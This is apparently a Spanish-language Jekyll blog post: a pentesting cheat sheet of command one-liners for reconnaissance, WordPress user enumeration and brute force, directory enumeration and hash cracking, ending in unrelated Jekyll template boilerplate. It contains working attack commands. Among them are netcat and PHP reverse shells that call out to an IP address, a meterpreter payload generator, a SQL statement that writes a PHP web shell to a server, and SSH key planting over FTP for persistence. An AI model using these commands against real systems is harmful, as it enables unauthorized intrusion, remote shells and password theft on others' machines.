---

layout: post
---

Buscar otros TLD de un dominio con DNSRecon

dnsrecon -t tld -d dominio.com

Listar los PTR de un rango IP con DNSRecon

dnsrecon -r 195.235.XXX.1-195.235.XXX.254 -t rvl

Buscar subdominios de un dominio

fierce --dns domain.com

Escaneo ARP de una red local.

arp-scan --localnet --ignoredups

Descubrir hosts activos en la red local.

netdiscover

Capturar documentos de un dominio con metagoofil

metagoofil -d www.eninsoft.com -t pdf -o /tmp/ -f /tmp/process.html

Capturar información de un host con Dmitry

dmitry -w -e -n -s www.eninsoft.com -o /tmp/process.html

Buscar infromación en motores de búsqueda.

theharvester -l 100 -b google -d www.eninsoft.com

Buscar vulnerabilidades con Wpscan

wpscan --url http://192.168.1.10/wp/ -e at -e ap -e u

Enumerar usuarios de WordPress con Wpscan

wpscan --url http://192.168.1.69 --enumerate u

Fuerza bruta de usuarios de WordPress con Wpscan

wpscan --url http://192.168.1.69 -U users.txt -P passwords.txt

Scanear todos los puertos modo agresivo con Nmap

nmap -p- -A 192.168.1.103

Enumeración de directorios con diccionario grande con Dirb

dirb http://192.168.1.103:8080 /usr/share/wordlists/dirb/big.txt
dirb http://192.168.1.221:8000 -X .php, .txt, .py /usr/share/wordlists/dirb/big.txt

Enumeración de directorios con diccionario grande con Dirsearch

./dirsearch -u http://192.168.1.103:8080 -e php -w /usr/share/wordlists/dirb/big.txt

Enumeración de directorios con diccionario grande con Gobuster

gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/big.txt

Enumeración de directorios con Dirbuster

dirbuster

Escaneo con Skipfish – Google tool -.

skipfish -b ie -Z -Q -o skipfishdir -U -S /usr/share/skipfish/dictionaries/medium.wl -W- https://www.eninsoft.com

skipfish -Y -L -o skipfishdir1 -X "toggle" https://www.eninsoft.com

Escaneo con Arachni.

** La versión que lleva parrot os por defecto no es la ultima, se recomienda descargar la ultima des de la web official.

~/Applications/arachni/bin/
./arachni_web

http://localhost:9292
Email: admin@admin.admin
Password: administrator

Crear un servidor web simple con Python 1/2/3.

python -SimpleHTTPServer

python2 -m SimpleHTTPServer 8080

python3 -m http.server 

Crear un servidor web simple con PHP.

php -S 0.0.0.0:8080

Decodificar un string codificado con Base64.

echo "am9objpZWlckczhZNDlJQiNaWko=" | base64 -d

Listar los ejecutables disponibles con permisos de sudo

sudo -l

Crear un ejecutable con una shell meterpreter reverse_tcp con MSF VENOM.

msfpc windows 192.168.1.69

Crear un puerto de escucha con netcat.

nc -lvp 4444

Conectarse a otra máquina con netcat.

nc 192.168.43.134 1337
nc -e /bin/bash 192.168.1.10 4444

Ejecutar un PHP reverse shell.

sudo /usr/bin/php -r '$sock=fsockopen("192.168.29.157",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Fuerza bruta de contraseñas con Hydra

hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.10 mysql  # Mysql
hydra -L user.txt -P dict.txt 192.168.1.101 ssh -s 65345 -e nsr  # SSH

SQL para subir una PHP shell en un servidor

select "<?php system($_GET['cmd']); ?>" into outfile '/var/tmp/raj.php';

Fuerza bruta de una Hash con JohnTheRipper.

john hash.txt
john --format=mssql12 --wordlist=./Tools/Wordlists/rockyou.txt ./hash.txt

Fuerza bruta de una HASH con Hashcat

hashcat ./hash.txt ./Tools/Wordlists/rockyou.txt
hashcat -m 1800 ./hash.txt ./Tools/Wordlists/rockyou.txt --force

Crear un diccionario con las palabras del contenido de una web con Cewl.

cewl http://192.168.1.10/ -w diccionario.txt

Crear una clave SSH privada-publica y subirla a un servidor FTP.

ssh-keygen
cd .ssh
ls
cat id_rsa.pub > authorized_keys
ls

#Conectamos por FTP en el servidor remoto para subir el archivo
ftp 192.168.1.101
mkdir .ssh
cd .ssh
put authorized_keys

Buscar archivos con el bit SUID

find / -perm -u=s -type f 2>/dev/null

Buscar exploit usando exploit-db

apt -y install exploitdb
searchsploit xxx    # package name
searchsploit -m 1245 

Sniffar el trafico de una red filtrando paquetes arp.

tcpdump -A -n host 192.168.1.10 and arp

Ver información extra de un archivo.

file archivo



{% highlight ruby %}
def print_hi(name)
  puts "Hi, #{name}"
end
print_hi('Tom')
#=> prints 'Hi, Tom' to STDOUT.
{% endhighlight %}

Check out the [Jekyll docs][jekyll-docs] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll Talk][jekyll-talk].

[jekyll-docs]: http://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/
